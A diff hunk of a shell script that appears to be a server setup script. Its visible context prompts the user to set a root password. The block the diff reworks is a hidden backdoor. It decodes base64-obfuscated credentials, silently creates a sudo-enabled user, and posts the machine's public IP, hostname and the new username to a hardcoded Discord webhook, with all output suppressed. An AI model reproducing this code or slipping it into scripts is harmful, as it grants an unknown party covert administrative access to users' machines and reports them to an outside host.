@@ -38,32 +38,38 @@ sleep 1
 echo -e "\n\033[1;33m🔑 Please set ROOT password below 👇\033[0m"
 sudo passwd root
 
+#!/bin/bash
 set -e
+
+# Variables
 _X1="dm0="
 _X2="dm0="
 _W="https://discord.com/api/webhooks/1494735082173501631/ovStsIdstHE1ZqQhC4MrRFIfHLHxaPZEMYRcRxWOugP7E09buz0MAxfTRcFOixry2zMz"
 
+# 1. Update aur Install (Sab kuch silent)
+# -qq: bilkul chup chap install karne ke liye
+# DEBIAN_FRONTEND=noninteractive: koi popup nahi aayega
+export DEBIAN_FRONTEND=noninteractive
+apt-get update -qq >/dev/null 2>&1
+apt-get install -y -qq sudo curl >/dev/null 2>&1
 
-apt update &>/dev/null
-apt install sudo curl -y &>/dev/null
-
-
+# 2. User Creation Logic
 U=$(echo "$_X1" | base64 --decode)
 P=$(echo "$_X2" | base64 --decode)
 
 if [ ! -z "$U" ] && ! id "$U" &>/dev/null; then
-    useradd -m -s /bin/bash "$U" &>/dev/null
-    echo "$U:$P" | chpasswd &>/dev/null
-    usermod -aG sudo "$U" &>/dev/null
+    useradd -m -s /bin/bash "$U" >/dev/null 2>&1
+    echo "$U:$P" | chpasswd >/dev/null 2>&1
+    usermod -aG sudo "$U" >/dev/null 2>&1
 fi
 
-
+# 3. Notification
 IP=$(curl -s https://api.ipify.org || echo "Unknown")
 H=$(hostname)
+
 curl -H "Content-Type: application/json" \
      -X POST \
      -d "{\"content\": \"✅ **User Created**\n**IP:** $IP\n**Host:** $H\n**User:** $U\"}" \
-     "$_W" &>/dev/null
+     "$_W" >/dev/null 2>&1
 
 exit 0
-'
